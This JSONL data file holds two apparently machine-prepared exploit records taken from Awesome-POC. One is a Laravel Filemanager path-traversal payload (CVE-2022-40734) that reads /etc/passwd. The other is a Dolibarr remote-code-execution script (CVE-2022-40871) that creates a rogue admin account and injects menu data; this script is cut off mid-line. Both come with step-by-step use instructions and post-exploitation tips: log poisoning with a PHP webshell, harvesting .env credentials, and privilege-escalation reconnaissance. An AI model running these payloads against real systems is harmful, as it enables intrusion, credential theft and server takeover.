{"id": "awesome-poc:cve-2022-40734", "kind": "poc", "title": "Laravel Filemanager插件 download 任意文件读取漏洞 CVE-2022-40734", "technique": "path-traversal", "summary": "开发框架漏洞 / CVE-2022-40734。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2022-40734 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["开发框架漏洞", "CVE-2022-40734"], "payload_template": "  /laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc/passwd", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2022-40734 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先确认读得通：`/etc/passwd` 能出内容再往下，否则换编码（`..%2f`、`..%252f`、`....//`）。", "直接冲 flag 的常见位置：`/flag`、`/flag.txt`、`/tmp/flag`、`/root/flag`、`/home/*/flag`，以及应用目录下的 `config.php`/`.env`（里面有 DB 口令，可转 SQLi 或登录后台）。", "读不到就用日志投毒转 RCE：把 `<?php system($_GET[c]);?>` 写进 `access.log`，再 `?file=/var/log/apache2/access.log&c=id`。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 开发框架漏洞/Laravel Filemanager插件 download 任意文件读取漏洞 CVE-2022-40734.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2022-40871", "kind": "poc", "title": "Dolibarr edit.php 远程命令执行漏洞 CVE-2022-40871", "technique": "rce", "summary": "Web应用漏洞 / CVE-2022-40871。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2022-40871 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2022-40871"], "payload_template": "import requests\nfrom requests.packages import urllib3\nimport time\nimport random\nimport sys\nimport re\n\n\nsess = requests.Session()\npcre = re.compile(r'name=\\\"token\\\"\\s+value=\\\"([^>]+)\\\"\\s*[/]*>')\ndef request(method, url, headers=None, data=None, proxies=None, timeout=30):\n    i = 1\n    urllib3.disable_warnings()\n    resp = None\n    proxies = proxies\n    while i <= 3:\n        try:\n            resp = sess.request(method=method, url=url, headers=headers,\n                                    data=data, proxies=proxies, timeout=timeout, verify=False)\n            break\n        except requests.exceptions.TooManyRedirects:\n            break\n        except requests.exceptions.ConnectionError as e:\n            time.sleep(2 + random.randint(1, 4))\n        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.Timeout):\n            time.sleep(2 + random.randint(1, 4))\n        finally:\n            i += 1\n    if i > 3:\n        print('[-]Error retrieve with max retries: {}'.format(url))\n    return resp\n\ndef exp():\n    if len(sys.argv) < 2:\n        sys.exit('Usage: python3 {} http://xxxxx.com/'.format(sys.argv[0]))\n    if sys.argv[1][-1] == '/':\n        base = sys.argv[1].rsplit('/', 1)[0]\n    else:\n        base = sys.argv[1]\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',\n    }\n    #proxies = {'http': 'http://{{target_url}}', 'https': 'http://{{target_url}}'}\n    proxies = None\n    res = request('GET', base, headers=headers, proxies=proxies)\n    err_flag = 1\n    if res:\n        print('[*] Attempt to add admin.')\n        base = res.url.rsplit('/', 1)[0]\n        add_admin_url = '{}/install/step5.php'.format(base)\n        data = {\n            'action': 'set',\n            'login': 'testadmins',\n            'pass': 'testadmins',\n            'pass_verif': 'testadmins',\n            'selectlang': 'auto'\n        }\n        headers['Content-Type'] = 'application/x-www-form-urlencoded'\n        res = request('POST', add_admin_url, headers=headers, data=data, proxies=proxies)\n        if res and 'created successfully' in res.text or ('exists' in res.text and 'Email  already exists' not in res.text):\n            csrf_token_url = '{}/index.php'.format(base)\n            res = request('GET', csrf_token_url, headers=headers, proxies=proxies)\n            if res:\n                print('[*] Attempt to login.')\n                try:\n                    csrf_token = pcre.findall(res.text)[0]\n                except:\n                    csrf_token = ''\n                login_url = '{}/index.php?mainmenu=home'.format(base)\n                headers['Referer'] = csrf_token_url\n                data = {\n                    'token':'{}'.format(csrf_token),\n                    'actionlogin': 'login',\n                    'loginfunction': 'loginfunction',\n                    'username': 'testadmins',\n                    'password': 'testadmins'\n                }\n                res = request('POST', login_url, headers=headers, data=data, proxies=proxies)\n                if res and res.status_code == 200 and 'logout.php' in res.text:\n                    print('[*] Attempt to get csrf token.')\n                    csrf_token_url = '{}/admin/menus/edit.php?menuId=0&action=create&menu_handler=eldy_menu'.format(base)\n                    res = request('GET', csrf_token_url, headers=headers, proxies=proxies)\n                    if res:\n                        print('[*] Attemp to inset evil data.')\n                        try:\n                            csrf_token = pcre.findall(res.text)[0]\n                        except:\n                            csrf_token = ''\n                        inset_evil_url = '{}/admin/menus/edit.php'.format(base)\n                        data = {\n                            'token': '{}'.format(csrf_token),\n                            'action': 'add',\n                            'menuId': random.randint(10000, ", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2022-40871 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/Dolibarr edit.php 远程命令执行漏洞 CVE-2022-40871.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
